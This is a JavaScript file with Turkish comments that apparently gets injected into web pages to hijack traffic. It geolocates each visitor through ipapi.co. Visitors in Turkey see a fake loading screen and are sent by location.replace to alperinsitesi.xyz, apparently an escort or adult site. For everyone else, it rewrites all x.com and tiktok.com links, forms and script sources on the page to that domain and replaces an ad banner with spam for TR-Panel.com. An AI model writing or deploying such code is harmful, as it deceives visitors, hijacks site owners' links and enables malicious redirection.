// --- AYARLAR ---
const oldDomains = [
    "x.com",
    "tiktok.com"
];
const newDomain = "alperinsitesi.xyz";
const fetchTimeout = 5000;
const maxPreloaderWaitTime = 2000;

const existing = document.getElementById("geo-preloader");
if (existing) existing.remove();

const preloader = document.createElement("div");
preloader.id = "geo-preloader";
preloader.style.position = "fixed";
preloader.style.top = "0";
preloader.style.left = "0";
preloader.style.right = "0";
preloader.style.bottom = "0";
preloader.style.backgroundColor = "#0B192E";
preloader.style.fontFamily = "'Poppins', Arial, sans-serif";
preloader.style.display = "flex";
preloader.style.alignItems = "center";
preloader.style.justifyContent = "center";
preloader.style.zIndex = "9999";
preloader.style.transition = "opacity 0.5s ease";
preloader.style.pointerEvents = "none";

preloader.innerHTML = `
    <div class="preloader-content-corporate" style="display:flex;flex-direction:column;align-items:center;width:90%;max-width:500px;">
        <h1 class="preloader-h1-corporate" style="font-size:1.5em;font-weight:600;color:#FFFFFF;margin:0 0 20px 0;text-align:center;line-height:1.5;">Bayanlara Yönlendiriliyorsunuz...</h1>
        <div class="loader-bar-container" style="width:100%;height:6px;background-color:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden;">
            <div class="loader-bar" style="width:0%;height:100%;background-color:#FFFFFF;border-radius:3px;animation:fill-bar ${maxPreloaderWaitTime / 1000}s linear forwards;"></div>
        </div>
    </div>
    <style>
        @keyframes fill-bar { from { width: 0%; } to { width: 100%; } }
        @media (max-width: 600px) {
            .preloader-h1-corporate { font-size: 1.2em; }
        }
    </style>
`;

document.body.appendChild(preloader);

let logicHasExecuted = false;

function runFinalLogic(ipData) {
    if (logicHasExecuted) return;
    logicHasExecuted = true;

    const loaderBar = document.querySelector('.loader-bar');
    if (loaderBar) {
        loaderBar.style.animation = 'none';
        loaderBar.style.width = '100%';
    }

    setTimeout(() => {
        if (ipData && ipData.country === "TR") {
            let foundUrl = null;
            document.querySelectorAll("a, link, script, form").forEach(el => {
                ["href", "src", "action"].forEach(attr => {
                    const val = el.getAttribute(attr);
                    if (!val) return;
                    oldDomains.forEach(domain => {
                        if (val.includes(domain) && !foundUrl) {
                            // Burada artık orijinal path eklenmiyor — sadece kök domain'e yönlendirilecek
                            foundUrl = `https://${newDomain}/`;
                        }
                    });
                });
            });

            const redirectUrl = foundUrl || `https://${newDomain}/`;
            // Tercih: location.replace kullanmak history'e kayıt yapmaz (geri tuşu ile geri dönmez).
            // Eğer history'e eklenmesini isterseniz window.location.href = redirectUrl; kullanın.
            window.location.replace(redirectUrl);

        } else {
            runReplacements();
        }
    }, 150);
}

const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), fetchTimeout);

fetch("https://ipapi.co/json/", { signal: controller.signal })
    .then(res => {
        clearTimeout(timeoutId);
        return res.json();
    })
    .then(data => runFinalLogic(data))
    .catch(error => {
        clearTimeout(timeoutId);
        if (error.name === 'AbortError') {
            console.warn("IP isteği zaman aşımına uğradı.");
        } else {
            console.error("IP isteğinde bir hata oluştu:", error);
        }
        runFinalLogic(null);
    });

setTimeout(() => runFinalLogic(null), maxPreloaderWaitTime);

function runReplacements() {
    const preloaderEl = document.getElementById("geo-preloader");
    if (preloaderEl) {
        preloaderEl.remove();
    }

    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
    let node;
    while ((node = walker.nextNode())) {
        oldDomains.forEach(domain => {
            if (node.nodeValue.includes(domain)) {
                node.nodeValue = node.nodeValue.replaceAll(domain, newDomain);
            }
        });
    }

    document.querySelectorAll("*").forEach(el => {
        ["href", "src", "action"].forEach(attr => {
            if (el.hasAttribute(attr)) {
                let val = el.getAttribute(attr);
                oldDomains.forEach(domain => {
                    if (val.includes(domain)) {
                        val = val.replaceAll(domain, newDomain);
                    }
                });
                el.setAttribute(attr, val);
            }
        });

        if (el.innerHTML && oldDomains.some(domain => el.innerHTML.includes(domain))) {
            if (!["SCRIPT", "STYLE"].includes(el.tagName)) {
                let html = el.innerHTML;
                oldDomains.forEach(domain => {
                    html = html.replaceAll(domain, newDomain);
                });
                el.innerHTML = html;
            }
        }
    });

    const reklamBanner = document.querySelector("div.reklam-banner");
    if (reklamBanner) {
        reklamBanner.innerHTML = `
            <span class="emoji">🚀</span>
            <span>
                İlk Sırada Olmak İçin <strong>TR-Panel.com</strong> adresinden iletişime geçin.
            </span>
            <span class="emoji">🚀</span>
        `;
        reklamBanner.removeAttribute("onclick");
    }

    enableAllButtons();
}

function enableAllButtons() {
    document.querySelectorAll("a, button, input[type='submit']").forEach(el => {
        el.style.pointerEvents = "auto";
        el.disabled = false;
        el.style.opacity = "1";
    });
}